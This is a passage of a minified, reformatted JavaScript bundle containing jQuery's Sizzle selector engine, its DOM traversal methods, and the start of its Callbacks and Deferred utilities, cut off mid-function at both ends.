                          o = t.getElementsByTagName(e);
                        if ("*" === e) {
                          for (; (n = o[i++]); ) 1 === n.nodeType && r.push(n);
                          return r;
                        }
                        return o;
                      }),
                  (r.find.CLASS =
                    n.getElementsByClassName &&
                    function (e, t) {
                      if (void 0 !== t.getElementsByClassName && g)
                        return t.getElementsByClassName(e);
                    }),
                  (v = []),
                  (m = []),
                  (n.qsa = ge.test(f.querySelectorAll)) &&
                    (T(function (e) {
                      var t;
                      (h.appendChild(e).innerHTML =
                        "<a id='" +
                        P +
                        "'></a><select id='" +
                        P +
                        "-\r\\' msallowcapture=''><option selected=''></option></select>"),
                        e.querySelectorAll("[msallowcapture^='']").length &&
                          m.push("[*^$]=" + ee + "*(?:''|\"\")"),
                        e.querySelectorAll("[selected]").length ||
                          m.push("\\[" + ee + "*(?:value|" + J + ")"),
                        e.querySelectorAll("[id~=" + P + "-]").length ||
                          m.push("~="),
                        (t = f.createElement("input")).setAttribute("name", ""),
                        e.appendChild(t),
                        e.querySelectorAll("[name='']").length ||
                          m.push(
                            "\\[" +
                              ee +
                              "*name" +
                              ee +
                              "*=" +
                              ee +
                              "*(?:''|\"\")"
                          ),
                        e.querySelectorAll(":checked").length ||
                          m.push(":checked"),
                        e.querySelectorAll("a#" + P + "+*").length ||
                          m.push(".#.+[+~]"),
                        e.querySelectorAll("\\\f"),
                        m.push("[\\r\\n\\f]");
                    }),
                    T(function (e) {
                      e.innerHTML =
                        "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
                      var t = f.createElement("input");
                      t.setAttribute("type", "hidden"),
                        e.appendChild(t).setAttribute("name", "D"),
                        e.querySelectorAll("[name=d]").length &&
                          m.push("name" + ee + "*[*^$|!~]?="),
                        2 !== e.querySelectorAll(":enabled").length &&
                          m.push(":enabled", ":disabled"),
                        (h.appendChild(e).disabled = !0),
                        2 !== e.querySelectorAll(":disabled").length &&
                          m.push(":enabled", ":disabled"),
                        e.querySelectorAll("*,:x"),
                        m.push(",.*:");
                    })),
                  (n.matchesSelector = ge.test(
                    (y =
                      h.matches ||
                      h.webkitMatchesSelector ||
                      h.mozMatchesSelector ||
                      h.oMatchesSelector ||
                      h.msMatchesSelector)
                  )) &&
                    T(function (e) {
                      (n.disconnectedMatch = y.call(e, "*")),
                        y.call(e, "[s!='']:x"),
                        v.push("!=", re);
                    }),
                  n.cssHas || m.push(":has"),
                  (m = m.length && new RegExp(m.join("|"))),
                  (v = v.length && new RegExp(v.join("|"))),
                  (t = ge.test(h.compareDocumentPosition)),
                  (b =
                    t || ge.test(h.contains)
                      ? function (e, t) {
                          var n = (9 === e.nodeType && e.documentElement) || e,
                            r = t && t.parentNode;
                          return (
                            e === r ||
                            !(
                              !r ||
                              1 !== r.nodeType ||
                              !(n.contains
                                ? n.contains(r)
                                : e.compareDocumentPosition &&
                                  16 & e.compareDocumentPosition(r))
                            )
                          );
                        }
                      : function (e, t) {
                          if (t)
                            for (; (t = t.parentNode); ) if (t === e) return !0;
                          return !1;
                        }),
                  (B = t
                    ? function (e, t) {
                        if (e === t) return (d = !0), 0;
                        var r =
                          !e.compareDocumentPosition -
                          !t.compareDocumentPosition;
                        return (
                          r ||
                          (1 &
                            (r =
                              (e.ownerDocument || e) == (t.ownerDocument || t)
                                ? e.compareDocumentPosition(t)
                                : 1) ||
                          (!n.sortDetached &&
                            t.compareDocumentPosition(e) === r)
                            ? e == f || (e.ownerDocument == I && b(I, e))
                              ? -1
                              : t == f || (t.ownerDocument == I && b(I, t))
                              ? 1
                              : u
                              ? Z(u, e) - Z(u, t)
                              : 0
                            : 4 & r
                            ? -1
                            : 1)
                        );
                      }
                    : function (e, t) {
                        if (e === t) return (d = !0), 0;
                        var n,
                          r = 0,
                          i = e.parentNode,
                          o = t.parentNode,
                          s = [e],
                          a = [t];
                        if (!i || !o)
                          return e == f
                            ? -1
                            : t == f
                            ? 1
                            : i
                            ? -1
                            : o
                            ? 1
                            : u
                            ? Z(u, e) - Z(u, t)
                            : 0;
                        if (i === o) return C(e, t);
                        for (n = e; (n = n.parentNode); ) s.unshift(n);
                        for (n = t; (n = n.parentNode); ) a.unshift(n);
                        for (; s[r] === a[r]; ) r++;
                        return r
                          ? C(s[r], a[r])
                          : s[r] == I
                          ? -1
                          : a[r] == I
                          ? 1
                          : 0;
                      }),
                  f)
                : f;
            }),
          (x.matches = function (e, t) {
            return x(e, null, null, t);
          }),
          (x.matchesSelector = function (e, t) {
            if (
              (p(e),
              n.matchesSelector &&
                g &&
                !z[t + " "] &&
                (!v || !v.test(t)) &&
                (!m || !m.test(t)))
            )
              try {
                var r = y.call(e, t);
                if (
                  r ||
                  n.disconnectedMatch ||
                  (e.document && 11 !== e.document.nodeType)
                )
                  return r;
              } catch (e) {
                z(t, !0);
              }
            return x(t, f, null, [e]).length > 0;
          }),
          (x.contains = function (e, t) {
            return (e.ownerDocument || e) != f && p(e), b(e, t);
          }),
          (x.attr = function (e, t) {
            (e.ownerDocument || e) != f && p(e);
            var i = r.attrHandle[t.toLowerCase()],
              o =
                i && G.call(r.attrHandle, t.toLowerCase())
                  ? i(e, t, !g)
                  : void 0;
            return void 0 !== o
              ? o
              : n.attributes || !g
              ? e.getAttribute(t)
              : (o = e.getAttributeNode(t)) && o.specified
              ? o.value
              : null;
          }),
          (x.escape = function (e) {
            return (e + "").replace(xe, we);
          }),
          (x.error = function (e) {
            throw new Error("Syntax error, unrecognized expression: " + e);
          }),
          (x.uniqueSort = function (e) {
            var t,
              r = [],
              i = 0,
              o = 0;
            if (
              ((d = !n.detectDuplicates),
              (u = !n.sortStable && e.slice(0)),
              e.sort(B),
              d)
            ) {
              for (; (t = e[o++]); ) t === e[o] && (i = r.push(o));
              for (; i--; ) e.splice(r[i], 1);
            }
            return (u = null), e;
          }),
          (i = x.getText =
            function (e) {
              var t,
                n = "",
                r = 0,
                o = e.nodeType;
              if (o) {
                if (1 === o || 9 === o || 11 === o) {
                  if ("string" == typeof e.textContent) return e.textContent;
                  for (e = e.firstChild; e; e = e.nextSibling) n += i(e);
                } else if (3 === o || 4 === o) return e.nodeValue;
              } else for (; (t = e[r++]); ) n += i(t);
              return n;
            }),
          (r = x.selectors =
            {
              cacheLength: 50,
              createPseudo: _,
              match: de,
              attrHandle: {},
              find: {},
              relative: {
                ">": { dir: "parentNode", first: !0 },
                " ": { dir: "parentNode" },
                "+": { dir: "previousSibling", first: !0 },
                "~": { dir: "previousSibling" },
              },
              preFilter: {
                ATTR: function (e) {
                  return (
                    (e[1] = e[1].replace(ye, be)),
                    (e[3] = (e[3] || e[4] || e[5] || "").replace(ye, be)),
                    "~=" === e[2] && (e[3] = " " + e[3] + " "),
                    e.slice(0, 4)
                  );
                },
                CHILD: function (e) {
                  return (
                    (e[1] = e[1].toLowerCase()),
                    "nth" === e[1].slice(0, 3)
                      ? (e[3] || x.error(e[0]),
                        (e[4] = +(e[4]
                          ? e[5] + (e[6] || 1)
                          : 2 * ("even" === e[3] || "odd" === e[3]))),
                        (e[5] = +(e[7] + e[8] || "odd" === e[3])))
                      : e[3] && x.error(e[0]),
                    e
                  );
                },
                PSEUDO: function (e) {
                  var t,
                    n = !e[6] && e[2];
                  return de.CHILD.test(e[0])
                    ? null
                    : (e[3]
                        ? (e[2] = e[4] || e[5] || "")
                        : n &&
                          ce.test(n) &&
                          (t = s(n, !0)) &&
                          (t = n.indexOf(")", n.length - t) - n.length) &&
                          ((e[0] = e[0].slice(0, t)), (e[2] = n.slice(0, t))),
                      e.slice(0, 3));
                },
              },
              filter: {
                TAG: function (e) {
                  var t = e.replace(ye, be).toLowerCase();
                  return "*" === e
                    ? function () {
                        return !0;
                      }
                    : function (e) {
                        return e.nodeName && e.nodeName.toLowerCase() === t;
                      };
                },
                CLASS: function (e) {
                  var t = U[e + " "];
                  return (
                    t ||
                    ((t = new RegExp("(^|" + ee + ")" + e + "(" + ee + "|$)")),
                    U(e, function (e) {
                      return t.test(
                        ("string" == typeof e.className && e.className) ||
                          (void 0 !== e.getAttribute &&
                            e.getAttribute("class")) ||
                          ""
                      );
                    }))
                  );
                },
                ATTR: function (e, t, n) {
                  return function (r) {
                    var i = x.attr(r, e);
                    return null == i
                      ? "!=" === t
                      : !t ||
                          ((i += ""),
                          "=" === t
                            ? i === n
                            : "!=" === t
                            ? i !== n
                            : "^=" === t
                            ? n && 0 === i.indexOf(n)
                            : "*=" === t
                            ? n && i.indexOf(n) > -1
                            : "$=" === t
                            ? n && i.slice(-n.length) === n
                            : "~=" === t
                            ? (" " + i.replace(ie, " ") + " ").indexOf(n) > -1
                            : "|=" === t &&
                              (i === n ||
                                i.slice(0, n.length + 1) === n + "-"));
                  };
                },
                CHILD: function (e, t, n, r, i) {
                  var o = "nth" !== e.slice(0, 3),
                    s = "last" !== e.slice(-4),
                    a = "of-type" === t;
                  return 1 === r && 0 === i
                    ? function (e) {
                        return !!e.parentNode;
                      }
                    : function (t, n, l) {
                        var c,
                          u,
                          d,
                          p,
                          f,
                          h,
                          g = o !== s ? "nextSibling" : "previousSibling",
                          m = t.parentNode,
                          v = a && t.nodeName.toLowerCase(),
                          y = !l && !a,
                          b = !1;
                        if (m) {
                          if (o) {
                            for (; g; ) {
                              for (p = t; (p = p[g]); )
                                if (
                                  a
                                    ? p.nodeName.toLowerCase() === v
                                    : 1 === p.nodeType
                                )
                                  return !1;
                              h = g = "only" === e && !h && "nextSibling";
                            }
                            return !0;
                          }
                          if (
                            ((h = [s ? m.firstChild : m.lastChild]), s && y)
                          ) {
                            for (
                              b =
                                (f =
                                  (c =
                                    (u =
                                      (d = (p = m)[P] || (p[P] = {}))[
                                        p.uniqueID
                                      ] || (d[p.uniqueID] = {}))[e] ||
                                    [])[0] === R && c[1]) && c[2],
                                p = f && m.childNodes[f];
                              (p =
                                (++f && p && p[g]) || (b = f = 0) || h.pop());

                            )
                              if (1 === p.nodeType && ++b && p === t) {
                                u[e] = [R, f, b];
                                break;
                              }
                          } else if (
                            (y &&
                              (b = f =
                                (c =
                                  (u =
                                    (d = (p = t)[P] || (p[P] = {}))[
                                      p.uniqueID
                                    ] || (d[p.uniqueID] = {}))[e] || [])[0] ===
                                  R && c[1]),
                            !1 === b)
                          )
                            for (
                              ;
                              (p =
                                (++f && p && p[g]) || (b = f = 0) || h.pop()) &&
                              ((a
                                ? p.nodeName.toLowerCase() !== v
                                : 1 !== p.nodeType) ||
                                !++b ||
                                (y &&
                                  ((u =
                                    (d = p[P] || (p[P] = {}))[p.uniqueID] ||
                                    (d[p.uniqueID] = {}))[e] = [R, b]),
                                p !== t));

                            );
                          return (b -= i) === r || (b % r == 0 && b / r >= 0);
                        }
                      };
                },
                PSEUDO: function (e, t) {
                  var n,
                    i =
                      r.pseudos[e] ||
                      r.setFilters[e.toLowerCase()] ||
                      x.error("unsupported pseudo: " + e);
                  return i[P]
                    ? i(t)
                    : i.length > 1
                    ? ((n = [e, e, "", t]),
                      r.setFilters.hasOwnProperty(e.toLowerCase())
                        ? _(function (e, n) {
                            for (var r, o = i(e, t), s = o.length; s--; )
                              e[(r = Z(e, o[s]))] = !(n[r] = o[s]);
                          })
                        : function (e) {
                            return i(e, 0, n);
                          })
                    : i;
                },
              },
              pseudos: {
                not: _(function (e) {
                  var t = [],
                    n = [],
                    r = a(e.replace(oe, "$1"));
                  return r[P]
                    ? _(function (e, t, n, i) {
                        for (var o, s = r(e, null, i, []), a = e.length; a--; )
                          (o = s[a]) && (e[a] = !(t[a] = o));
                      })
                    : function (e, i, o) {
                        return (
                          (t[0] = e), r(t, null, o, n), (t[0] = null), !n.pop()
                        );
                      };
                }),
                has: _(function (e) {
                  return function (t) {
                    return x(e, t).length > 0;
                  };
                }),
                contains: _(function (e) {
                  return (
                    (e = e.replace(ye, be)),
                    function (t) {
                      return (t.textContent || i(t)).indexOf(e) > -1;
                    }
                  );
                }),
                lang: _(function (e) {
                  return (
                    ue.test(e || "") || x.error("unsupported lang: " + e),
                    (e = e.replace(ye, be).toLowerCase()),
                    function (t) {
                      var n;
                      do {
                        if (
                          (n = g
                            ? t.lang
                            : t.getAttribute("xml:lang") ||
                              t.getAttribute("lang"))
                        )
                          return (
                            (n = n.toLowerCase()) === e ||
                            0 === n.indexOf(e + "-")
                          );
                      } while ((t = t.parentNode) && 1 === t.nodeType);
                      return !1;
                    }
                  );
                }),
                target: function (t) {
                  var n = e.location && e.location.hash;
                  return n && n.slice(1) === t.id;
                },
                root: function (e) {
                  return e === h;
                },
                focus: function (e) {
                  return (
                    e === f.activeElement &&
                    (!f.hasFocus || f.hasFocus()) &&
                    !!(e.type || e.href || ~e.tabIndex)
                  );
                },
                enabled: E(!1),
                disabled: E(!0),
                checked: function (e) {
                  var t = e.nodeName.toLowerCase();
                  return (
                    ("input" === t && !!e.checked) ||
                    ("option" === t && !!e.selected)
                  );
                },
                selected: function (e) {
                  return (
                    e.parentNode && e.parentNode.selectedIndex,
                    !0 === e.selected
                  );
                },
                empty: function (e) {
                  for (e = e.firstChild; e; e = e.nextSibling)
                    if (e.nodeType < 6) return !1;
                  return !0;
                },
                parent: function (e) {
                  return !r.pseudos.empty(e);
                },
                header: function (e) {
                  return he.test(e.nodeName);
                },
                input: function (e) {
                  return fe.test(e.nodeName);
                },
                button: function (e) {
                  var t = e.nodeName.toLowerCase();
                  return (
                    ("input" === t && "button" === e.type) || "button" === t
                  );
                },
                text: function (e) {
                  var t;
                  return (
                    "input" === e.nodeName.toLowerCase() &&
                    "text" === e.type &&
                    (null == (t = e.getAttribute("type")) ||
                      "text" === t.toLowerCase())
                  );
                },
                first: D(function () {
                  return [0];
                }),
                last: D(function (e, t) {
                  return [t - 1];
                }),
                eq: D(function (e, t, n) {
                  return [n < 0 ? n + t : n];
                }),
                even: D(function (e, t) {
                  for (var n = 0; n < t; n += 2) e.push(n);
                  return e;
                }),
                odd: D(function (e, t) {
                  for (var n = 1; n < t; n += 2) e.push(n);
                  return e;
                }),
                lt: D(function (e, t, n) {
                  for (var r = n < 0 ? n + t : n > t ? t : n; --r >= 0; )
                    e.push(r);
                  return e;
                }),
                gt: D(function (e, t, n) {
                  for (var r = n < 0 ? n + t : n; ++r < t; ) e.push(r);
                  return e;
                }),
              },
            }),
          (r.pseudos.nth = r.pseudos.eq),
          { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }))
            r.pseudos[t] = $(t);
          for (t in { submit: !0, reset: !0 }) r.pseudos[t] = S(t);
          function Ae(e, t, n, r, i, o) {
            return (
              r && !r[P] && (r = Ae(r)),
              i && !i[P] && (i = Ae(i, o)),
              _(function (o, s, a, l) {
                var c,
                  u,
                  d,
                  p = [],
                  f = [],
                  h = s.length,
                  g = o || N(t || "*", a.nodeType ? [a] : a, []),
                  m = !e || (!o && t) ? g : H(g, p, e, a, l),
                  v = n ? (i || (o ? e : h || r) ? [] : s) : m;
                if ((n && n(m, v, a, l), r))
                  for (c = H(v, f), r(c, [], a, l), u = c.length; u--; )
                    (d = c[u]) && (v[f[u]] = !(m[f[u]] = d));
                if (o) {
                  if (i || e) {
                    if (i) {
                      for (c = [], u = v.length; u--; )
                        (d = v[u]) && c.push((m[u] = d));
                      i(null, (v = []), c, l);
                    }
                    for (u = v.length; u--; )
                      (d = v[u]) &&
                        (c = i ? Z(o, d) : p[u]) > -1 &&
                        (o[c] = !(s[c] = d));
                  }
                } else (v = H(v === s ? v.splice(h, v.length) : v)), i ? i(null, s, v, l) : V.apply(s, v);
              })
            );
          }
          function Ce(e) {
            for (
              var t,
                n,
                i,
                o = e.length,
                s = r.relative[e[0].type],
                a = s || r.relative[" "],
                l = s ? 1 : 0,
                u = O(
                  function (e) {
                    return e === t;
                  },
                  a,
                  !0
                ),
                d = O(
                  function (e) {
                    return Z(t, e) > -1;
                  },
                  a,
                  !0
                ),
                p = [
                  function (e, n, r) {
                    var i =
                      (!s && (r || n !== c)) ||
                      ((t = n).nodeType ? u(e, n, r) : d(e, n, r));
                    return (t = null), i;
                  },
                ];
              l < o;
              l++
            )
              if ((n = r.relative[e[l].type])) p = [O(q(p), n)];
              else {
                if ((n = r.filter[e[l].type].apply(null, e[l].matches))[P]) {
                  for (i = ++l; i < o && !r.relative[e[i].type]; i++);
                  return Ae(
                    l > 1 && q(p),
                    l > 1 &&
                      j(
                        e
                          .slice(0, l - 1)
                          .concat({ value: " " === e[l - 2].type ? "*" : "" })
                      ).replace(oe, "$1"),
                    n,
                    l < i && Ce(e.slice(l, i)),
                    i < o && Ce((e = e.slice(i))),
                    i < o && j(e)
                  );
                }
                p.push(n);
              }
            return q(p);
          }
          return (
            (L.prototype = r.filters = r.pseudos),
            (r.setFilters = new L()),
            (s = x.tokenize =
              function (e, t) {
                var n,
                  i,
                  o,
                  s,
                  a,
                  l,
                  c,
                  u = F[e + " "];
                if (u) return t ? 0 : u.slice(0);
                for (a = e, l = [], c = r.preFilter; a; ) {
                  for (s in ((n && !(i = se.exec(a))) ||
                    (i && (a = a.slice(i[0].length) || a), l.push((o = []))),
                  (n = !1),
                  (i = ae.exec(a)) &&
                    ((n = i.shift()),
                    o.push({ value: n, type: i[0].replace(oe, " ") }),
                    (a = a.slice(n.length))),
                  r.filter))
                    !(i = de[s].exec(a)) ||
                      (c[s] && !(i = c[s](i))) ||
                      ((n = i.shift()),
                      o.push({ value: n, type: s, matches: i }),
                      (a = a.slice(n.length)));
                  if (!n) break;
                }
                return t ? a.length : a ? x.error(e) : F(e, l).slice(0);
              }),
            (a = x.compile =
              function (e, t) {
                var n,
                  i = [],
                  o = [],
                  a = W[e + " "];
                if (!a) {
                  for (t || (t = s(e)), n = t.length; n--; )
                    (a = Ce(t[n]))[P] ? i.push(a) : o.push(a);
                  (a = W(
                    e,
                    (function (e, t) {
                      var n = t.length > 0,
                        i = e.length > 0,
                        o = function (o, s, a, l, u) {
                          var d,
                            h,
                            m,
                            v = 0,
                            y = "0",
                            b = o && [],
                            w = [],
                            _ = c,
                            T = o || (i && r.find.TAG("*", u)),
                            A = (R += null == _ ? 1 : Math.random() || 0.1),
                            C = T.length;
                          for (
                            u && (c = s == f || s || u);
                            y !== C && null != (d = T[y]);
                            y++
                          ) {
                            if (i && d) {
                              for (
                                h = 0,
                                  s || d.ownerDocument == f || (p(d), (a = !g));
                                (m = e[h++]);

                              )
                                if (m(d, s || f, a)) {
                                  l.push(d);
                                  break;
                                }
                              u && (R = A);
                            }
                            n && ((d = !m && d) && v--, o && b.push(d));
                          }
                          if (((v += y), n && y !== v)) {
                            for (h = 0; (m = t[h++]); ) m(b, w, s, a);
                            if (o) {
                              if (v > 0)
                                for (; y--; )
                                  b[y] || w[y] || (w[y] = K.call(l));
                              w = H(w);
                            }
                            V.apply(l, w),
                              u &&
                                !o &&
                                w.length > 0 &&
                                v + t.length > 1 &&
                                x.uniqueSort(l);
                          }
                          return u && ((R = A), (c = _)), b;
                        };
                      return n ? _(o) : o;
                    })(o, i)
                  )),
                    (a.selector = e);
                }
                return a;
              }),
            (l = x.select =
              function (e, t, n, i) {
                var o,
                  l,
                  c,
                  u,
                  d,
                  p = "function" == typeof e && e,
                  f = !i && s((e = p.selector || e));
                if (((n = n || []), 1 === f.length)) {
                  if (
                    (l = f[0] = f[0].slice(0)).length > 2 &&
                    "ID" === (c = l[0]).type &&
                    9 === t.nodeType &&
                    g &&
                    r.relative[l[1].type]
                  ) {
                    if (
                      !(t = (r.find.ID(c.matches[0].replace(ye, be), t) ||
                        [])[0])
                    )
                      return n;
                    p && (t = t.parentNode),
                      (e = e.slice(l.shift().value.length));
                  }
                  for (
                    o = de.needsContext.test(e) ? 0 : l.length;
                    o-- && ((c = l[o]), !r.relative[(u = c.type)]);

                  )
                    if (
                      (d = r.find[u]) &&
                      (i = d(
                        c.matches[0].replace(ye, be),
                        (ve.test(l[0].type) && k(t.parentNode)) || t
                      ))
                    ) {
                      if ((l.splice(o, 1), !(e = i.length && j(l))))
                        return V.apply(n, i), n;
                      break;
                    }
                }
                return (
                  (p || a(e, f))(
                    i,
                    t,
                    !g,
                    n,
                    !t || (ve.test(e) && k(t.parentNode)) || t
                  ),
                  n
                );
              }),
            (n.sortStable = P.split("").sort(B).join("") === P),
            (n.detectDuplicates = !!d),
            p(),
            (n.sortDetached = T(function (e) {
              return 1 & e.compareDocumentPosition(f.createElement("fieldset"));
            })),
            T(function (e) {
              return (
                (e.innerHTML = "<a href='#'></a>"),
                "#" === e.firstChild.getAttribute("href")
              );
            }) ||
              A("type|href|height|width", function (e, t, n) {
                if (!n)
                  return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2);
              }),
            (n.attributes &&
              T(function (e) {
                return (
                  (e.innerHTML = "<input/>"),
                  e.firstChild.setAttribute("value", ""),
                  "" === e.firstChild.getAttribute("value")
                );
              })) ||
              A("value", function (e, t, n) {
                if (!n && "input" === e.nodeName.toLowerCase())
                  return e.defaultValue;
              }),
            T(function (e) {
              return null == e.getAttribute("disabled");
            }) ||
              A(J, function (e, t, n) {
                var r;
                if (!n)
                  return !0 === e[t]
                    ? t.toLowerCase()
                    : (r = e.getAttributeNode(t)) && r.specified
                    ? r.value
                    : null;
              }),
            x
          );
        })(e);
        (de.find = pe),
          (de.expr = pe.selectors),
          (de.expr[":"] = de.expr.pseudos),
          (de.uniqueSort = de.unique = pe.uniqueSort),
          (de.text = pe.getText),
          (de.isXMLDoc = pe.isXML),
          (de.contains = pe.contains),
          (de.escapeSelector = pe.escape);
        var fe = function (e, t, n) {
            for (var r = [], i = void 0 !== n; (e = e[t]) && 9 !== e.nodeType; )
              if (1 === e.nodeType) {
                if (i && de(e).is(n)) break;
                r.push(e);
              }
            return r;
          },
          he = function (e, t) {
            for (var n = []; e; e = e.nextSibling)
              1 === e.nodeType && e !== t && n.push(e);
            return n;
          },
          ge = de.expr.match.needsContext,
          me =
            /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;
        (de.filter = function (e, t, n) {
          var r = t[0];
          return (
            n && (e = ":not(" + e + ")"),
            1 === t.length && 1 === r.nodeType
              ? de.find.matchesSelector(r, e)
                ? [r]
                : []
              : de.find.matches(
                  e,
                  de.grep(t, function (e) {
                    return 1 === e.nodeType;
                  })
                )
          );
        }),
          de.fn.extend({
            find: function (e) {
              var t,
                n,
                r = this.length,
                i = this;
              if ("string" != typeof e)
                return this.pushStack(
                  de(e).filter(function () {
                    for (t = 0; t < r; t++)
                      if (de.contains(i[t], this)) return !0;
                  })
                );
              for (n = this.pushStack([]), t = 0; t < r; t++)
                de.find(e, i[t], n);
              return r > 1 ? de.uniqueSort(n) : n;
            },
            filter: function (e) {
              return this.pushStack(a(this, e || [], !1));
            },
            not: function (e) {
              return this.pushStack(a(this, e || [], !0));
            },
            is: function (e) {
              return !!a(
                this,
                "string" == typeof e && ge.test(e) ? de(e) : e || [],
                !1
              ).length;
            },
          });
        var ve,
          ye = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
        ((de.fn.init = function (e, t, n) {
          var r, i;
          if (!e) return this;
          if (((n = n || ve), "string" == typeof e)) {
            if (
              !(r =
                "<" === e[0] && ">" === e[e.length - 1] && e.length >= 3
                  ? [null, e, null]
                  : ye.exec(e)) ||
              (!r[1] && t)
            )
              return !t || t.jquery
                ? (t || n).find(e)
                : this.constructor(t).find(e);
            if (r[1]) {
              if (
                ((t = t instanceof de ? t[0] : t),
                de.merge(
                  this,
                  de.parseHTML(
                    r[1],
                    t && t.nodeType ? t.ownerDocument || t : le,
                    !0
                  )
                ),
                me.test(r[1]) && de.isPlainObject(t))
              )
                for (r in t) se(this[r]) ? this[r](t[r]) : this.attr(r, t[r]);
              return this;
            }
            return (
              (i = le.getElementById(r[2])) &&
                ((this[0] = i), (this.length = 1)),
              this
            );
          }
          return e.nodeType
            ? ((this[0] = e), (this.length = 1), this)
            : se(e)
            ? void 0 !== n.ready
              ? n.ready(e)
              : e(de)
            : de.makeArray(e, this);
        }).prototype = de.fn),
          (ve = de(le));
        var be = /^(?:parents|prev(?:Until|All))/,
          xe = { children: !0, contents: !0, next: !0, prev: !0 };
        de.fn.extend({
          has: function (e) {
            var t = de(e, this),
              n = t.length;
            return this.filter(function () {
              for (var e = 0; e < n; e++)
                if (de.contains(this, t[e])) return !0;
            });
          },
          closest: function (e, t) {
            var n,
              r = 0,
              i = this.length,
              o = [],
              s = "string" != typeof e && de(e);
            if (!ge.test(e))
              for (; r < i; r++)
                for (n = this[r]; n && n !== t; n = n.parentNode)
                  if (
                    n.nodeType < 11 &&
                    (s
                      ? s.index(n) > -1
                      : 1 === n.nodeType && de.find.matchesSelector(n, e))
                  ) {
                    o.push(n);
                    break;
                  }
            return this.pushStack(o.length > 1 ? de.uniqueSort(o) : o);
          },
          index: function (e) {
            return e
              ? "string" == typeof e
                ? J.call(de(e), this[0])
                : J.call(this, e.jquery ? e[0] : e)
              : this[0] && this[0].parentNode
              ? this.first().prevAll().length
              : -1;
          },
          add: function (e, t) {
            return this.pushStack(
              de.uniqueSort(de.merge(this.get(), de(e, t)))
            );
          },
          addBack: function (e) {
            return this.add(
              null == e ? this.prevObject : this.prevObject.filter(e)
            );
          },
        }),
          de.each(
            {
              parent: function (e) {
                var t = e.parentNode;
                return t && 11 !== t.nodeType ? t : null;
              },
              parents: function (e) {
                return fe(e, "parentNode");
              },
              parentsUntil: function (e, t, n) {
                return fe(e, "parentNode", n);
              },
              next: function (e) {
                return l(e, "nextSibling");
              },
              prev: function (e) {
                return l(e, "previousSibling");
              },
              nextAll: function (e) {
                return fe(e, "nextSibling");
              },
              prevAll: function (e) {
                return fe(e, "previousSibling");
              },
              nextUntil: function (e, t, n) {
                return fe(e, "nextSibling", n);
              },
              prevUntil: function (e, t, n) {
                return fe(e, "previousSibling", n);
              },
              siblings: function (e) {
                return he((e.parentNode || {}).firstChild, e);
              },
              children: function (e) {
                return he(e.firstChild);
              },
              contents: function (e) {
                return null != e.contentDocument && X(e.contentDocument)
                  ? e.contentDocument
                  : (s(e, "template") && (e = e.content || e),
                    de.merge([], e.childNodes));
              },
            },
            function (e, t) {
              de.fn[e] = function (n, r) {
                var i = de.map(this, t, n);
                return (
                  "Until" !== e.slice(-5) && (r = n),
                  r && "string" == typeof r && (i = de.filter(r, i)),
                  this.length > 1 &&
                    (xe[e] || de.uniqueSort(i), be.test(e) && i.reverse()),
                  this.pushStack(i)
                );
              };
            }
          );
        var we = /[^\x20\t\r\n\f]+/g;
        (de.Callbacks = function (e) {
          e =
            "string" == typeof e
              ? (function (e) {
                  var t = {};
                  return (
                    de.each(e.match(we) || [], function (e, n) {
                      t[n] = !0;
                    }),
                    t
                  );
                })(e)
              : de.extend({}, e);
          var t,
            n,
            r,
            o,
            s = [],
            a = [],
            l = -1,
            c = function () {
              for (o = o || e.once, r = t = !0; a.length; l = -1)
                for (n = a.shift(); ++l < s.length; )
                  !1 === s[l].apply(n[0], n[1]) &&
                    e.stopOnFalse &&
                    ((l = s.length), (n = !1));
              e.memory || (n = !1), (t = !1), o && (s = n ? [] : "");
            },
            u = {
              add: function () {
                return (
                  s &&
                    (n && !t && ((l = s.length - 1), a.push(n)),
                    (function t(n) {
                      de.each(n, function (n, r) {
                        se(r)
                          ? (e.unique && u.has(r)) || s.push(r)
                          : r && r.length && "string" !== i(r) && t(r);
                      });
                    })(arguments),
                    n && !t && c()),
                  this
                );
              },
              remove: function () {
                return (
                  de.each(arguments, function (e, t) {
                    for (var n; (n = de.inArray(t, s, n)) > -1; )
                      s.splice(n, 1), n <= l && l--;
                  }),
                  this
                );
              },
              has: function (e) {
                return e ? de.inArray(e, s) > -1 : s.length > 0;
              },
              empty: function () {
                return s && (s = []), this;
              },
              disable: function () {
                return (o = a = []), (s = n = ""), this;
              },
              disabled: function () {
                return !s;
              },
              lock: function () {
                return (o = a = []), n || t || (s = n = ""), this;
              },
              locked: function () {
                return !!o;
              },
              fireWith: function (e, n) {
                return (
                  o ||
                    ((n = [e, (n = n || []).slice ? n.slice() : n]),
                    a.push(n),
                    t || c()),
                  this
                );
              },
              fire: function () {
                return u.fireWith(this, arguments), this;
              },
              fired: function () {
                return !!r;
              },
            };
          return u;
        }),
          de.extend({
            Deferred: function (t) {
              var n = [
                  [
                    "notify",
                    "progress",
                    de.Callbacks("memory"),
                    de.Callbacks("memory"),
                    2,
                  ],
                  [
                    "resolve",
                    "done",
                    de.Callbacks("once memory"),
                    de.Callbacks("once memory"),
                    0,
                    "resolved",
                  ],
                  [
                    "reject",
                    "fail",
                    de.Callbacks("once memory"),
                    de.Callbacks("once memory"),
                    1,
                    "rejected",
                  ],
                ],
                r = "pending",
                i = {
                  state: function () {
                    return r;
                  },
                  always: function () {
                    return o.done(arguments).fail(arguments), this;
                  },
                  catch: function (e) {
                    return i.then(null, e);
                  },
                  pipe: function () {
                    var e = arguments;
                    return de
                      .Deferred(function (t) {
                        de.each(n, function (n, r) {
                          var i = se(e[r[4]]) && e[r[4]];
                          o[r[1]](function () {
                            var e = i && i.apply(this, arguments);
                            e && se(e.promise)
                              ? e
                                  .promise()
                                  .progress(t.notify)
                                  .done(t.resolve)
                                  .fail(t.reject)
                              : t[r[0] + "With"](this, i ? [e] : arguments);
                          });
                        }),
                          (e = null);
                      })
                      .promise();
                  },
                  then: function (t, r, i) {
                    var o = 0;
                    function s(t, n, r, i) {
                      return function () {
                        var a = this,
                          l = arguments,
                          d = function () {
                            var e, d;
                            if (!(t < o)) {
                              if ((e = r.apply(a, l)) === n.promise())
                                throw new TypeError("Thenable self-resolution");
                              (d =
                                e &&
                                ("object" == typeof e ||
                                  "function" == typeof e) &&
                                e.then),
                                se(d)
                                  ? i
                                    ? d.call(e, s(o, n, c, i), s(o, n, u, i))
                                    : (o++,
                                      d.call(
